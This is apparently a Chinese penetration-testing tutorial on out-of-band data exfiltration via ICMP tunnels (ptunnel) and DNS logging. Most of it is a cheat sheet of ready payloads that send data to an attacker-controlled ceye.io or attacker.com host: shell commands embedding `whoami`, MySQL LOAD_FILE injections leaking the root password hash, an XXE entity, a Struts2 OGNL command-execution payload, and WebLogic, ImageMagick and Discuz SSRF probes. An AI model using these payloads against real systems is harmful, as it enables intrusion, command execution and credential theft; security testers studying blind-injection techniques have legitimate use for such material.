### 大话带外（out-of-bind）数据

在渗透测试中我们有时候会遇到一种情况，就是你知道有漏洞但是不能回显出来

无论是在任何利用中例如无回显的XXE ，SQL，命令执行等

我们都可以通过带外的一个方法来进行数据的输出



除此之外我们使用SQL注入时，如果使用基于时间，基于布尔等盲注

以为了我们每次字符的猜解都需要发送大量的请求过去

难免不被服务器的防火墙软件检测到



这时，带外通道的隐蔽性这一优势就凸显的出来



而带外通道的建立选择显得就很重要

TCP需要建立连接 并且防火墙都盯着很严格所以放弃

ICMP和DNS当然可以存在带外通道的建立



### 0x00 ICMP实现带外通道

IMCP也就是我们`ping` 命令使用的协议，又叫做控制报文协议。它是一个无连接的协议，用于在IP主机或者路由器中错误检测，可达性检测。



查看IMCP协议我们了解一下IMCP的请求头格式

```
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |     Type      |     Code      |          Checksum             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |           Identifier          |        Sequence Number        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |     Data ...
   +-+-+-+-+-
```



抓个包观察一下（linux环境中）

在一篇博客中详解了windos和linux之间的差距

https://blog.csdn.net/qq_27446553/article/details/81166980



![1556796594216](C:\Users\Leeport\AppData\Local\Temp\1556796594216.png)

![1556796624468](C:\Users\Leeport\AppData\Local\Temp\1556796624468.png)



从上面的分析不难想到，我们是否可以从data这里把数据给带出来？

那我们的方式确定了，如何实践就是我们需要讨论的。

这里我们有直接使用的工具

`ptunnel   ` 

这种情况需要适用有跳板机的情况

就是存在一个内网主机，一个内网跳板机可以连接公网，一个自己的VPS

 内网主机可以和跳板机相互ping通

我们需要自己的VPS连接内网主机



（其实我觉得这算是ICMP隧道的建立，因为你都拿到了跳板机和内网终端的权限了）





![QQ图片20190503134753](C:\Users\Leeport\Desktop\QQ图片20190503134753.jpg)



其实上面隧道实现的基本条件时需要保障ping命令使用成功





## 0x01 通过dns实现带外通道

其实DNS带外通道源自面试中遇到的一个问题？

当你有一个命令执行的漏洞但是却没有回显，只有命令执行这个功能应该怎么利用？

当时也没有给出很好的答案，于是才决定总结一下带外注入



以上情况我觉得使用DNS是解决的最好途径，因为ICMP隧道的话需要安全` ptunnel` 并且多用于内网穿透

而不是带外的目的



最常用的dns实现带外数据的方法还是通过[ceye平台](http://ceye.io/) 

通过把返回数据放在域名解析中，然后进行一个DNS查询，查看DNS解析记录来获取返回信息



例如一个payload:

(linux)

```
ping `whoami`.ip.port.b182oj.ceye.io
```

在域名查询的过程中服务器首先本地检索是否有这个域名的ip没有转到自己的DNS服务器上查询

然后自己的DNS服务器又转去 ` ceye.io` 这个的dns查询，这个的dns有一个ns记录然后就将把这次域名的解析

转给了属于用户的服务器进行查询，最后我们阅读DNS解析就可以看到带外的数据了

![1556865191418](C:\Users\Leeport\AppData\Local\Temp\1556865191418.png) 

常见的payload如下



### *inux:

```
curl http://ip.port.b182oj.ceye.io/`whoami`
ping `whoami`.ip.port.b182oj.ceye.io
```



### windos:

```
ping %USERNAME%.b182oj.ceye.io
```





### sql:

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));
```

以下是使用MySQL的函数LOAD_FILE()将系统管理员的密码通过DNS解析机制传输的例子： 

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root'  LIMIT 1),'.attacker.com\\foobar'));
```

 

就以sql盲注为例。深入理解下DNSlog注入过程：

首先提一下load_file()函数，

读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet。

通过DNSlog盲注需要用到load_file()函数。show variables like '%secure%';查看load_file()可以读取的磁盘。

1、当secure_file_priv为空，就可以读取磁盘的目录。

2、当secure_file_priv为G:\，就可以读取G盘的文件。

3、当secure_file_priv为null，load_file就不能加载文件。

通过设置my.ini来配置。secure_file_priv=""就是可以load_flie任意磁盘的文件。

当我们遇到盲注的时候，大家的常规思路是什么？无非两种，一延时，二基于内容特征。而这两种方法都是一个字符一个字符的判断，效率很低。另外要发送大量的get请求，那么这种行为很容易被目标物理防火墙认定位是黑客行为，最终导致IP被ban。

但有了DNSLOG可就不一样了。当遇到盲注的时候，我们可以用这样的PAYLOAD。

```
load_file(concat('\\\\',(select database()),'.abcdef.ceye.io\\aaa'))
```

 

在这里我们需要了解load_file是可以发送DNS请求的。

所以就等同于访问了database().abcdef.ceye.io，然后我们的ceye平台就会有记录，那么database()是不是就得到了呢？这种方法比逐字判断是要方便很多吧。

接下来注入就是库表列，语句自由组合。

例如 

```
select schema_name from information_schema.schemata limit 0,1
```

 

要注意的是数据很可能不止一行，因此要用limit分次输出。

MySQL的函数LOAD_FILE()读取文件内容并将其作为字符串返回：

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc')); 

' and if((select load_file(concat('\\\\',(select database()),'.xxxxx.ceye.io\\abc'))),1,0)-- -+
```



### XXE:

```


<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE root [ 
<!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test"> 
%remote;]> 
<root/>


```





### Struts2:

```
xx.action?redirect:http://ip.port.b182oj.ceye.io/%25{3*4} 

xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.b182oj.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```





### weblogic:

```


xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search 


```





### ImageMagick：

```
push graphic-context 
viewbox 0 0 640 480 
fill 'url(http://ip.port.b182oj.ceye.io)' 
pop graphic-context 
```





### Discuz:

```
http://xxx.xxxx.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&formhash=xxoo
```



参考链接：

http://www.cnblogs.com/zhaijiahui/p/9160913.html

